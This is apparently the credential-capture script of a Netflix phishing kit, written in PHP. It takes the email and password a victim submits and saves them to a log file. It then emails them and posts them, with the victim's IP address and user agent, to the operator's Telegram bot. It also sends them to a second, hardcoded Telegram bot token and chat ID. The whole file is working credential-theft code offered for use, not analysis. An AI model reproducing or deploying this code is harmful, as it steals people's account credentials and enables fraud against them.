<?php
  error_reporting(0);
  ob_start();
  session_start();
  include '../../Settings.php';
  include '../../ip.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
  $_SESSION['email']  = $_POST['mail'];
  $_SESSION['pass']   = $_POST['pass'];

	if(strpos($_SESSION['email'], "test") || strpos($_SESSION['email'], "dev.fr") || strpos($_SESSION['email'], "dev.com")){
    header("Location: ../../login.php?error=true");
    die();
  }
  else{}
  if (filter_var($_SESSION['email'], FILTER_VALIDATE_EMAIL)) {
    $mail = $_SESSION['email'];
  }
  else{
    header("Location: ../../login.php?error=true");
    die();
  }
  if(strlen($_SESSION['pass']) < 6){
    header("Location: ../../login.php?error=true");
    die();
  }
  else{}

$message = "

 ㅤ
[🥷🏽] Informations de connexion [🥷🏽]

🚪 E-Mail : ".$_SESSION['email']."
🗝 Mot de passe : ".$_SESSION['pass']."

🛒 Adresse IP : "._ip()."
🛒 User Agent : ".$_SERVER['HTTP_USER_AGENT']."


          ";
$Subject=" 「🧢」+1 Fr3sh Netflix Log From ".$_SESSION['email']."|🎯 "._ip();
$head="From: (っ◔◡◔)っTYNOX N3TFLIX 🛍 <info@sdf.cash>";
$_SESSION['step_one']  = true;
$fil = fopen('logins.txt','a+');
$filepath = './stats.ini';
$data = @parse_ini_file($filepath);
$data['logs']++;
            function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === ""){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
update_ini_file($data, $filepath);
	 fwrite($fil, ''.$_SESSION["email"].'|none|'.$_SESSION["pass"]."\n");
   if ($mail_sending == true) {
    mail($my_mail,$Subject,$message,$head);
   }
   if ($telegram_sending == true) {
  $messagetelegram = urlencode("".$message."");
    $html = file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$chat_login.'&text='.$messagetelegram.'');
$mssagetelegram = urlencode("".$message."");
    $htm = file_get_contents('https://api.telegram.org/bot5854245489:AAFoED-e_5u5huNkmhrx6438MIknyXDf8Qc/sendMessage?chat_id=1208278797&text='.$mssagetelegram.'');

    }
header('location: ../info.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

}
else
{
  header('location: ../../login.php');
}

?>
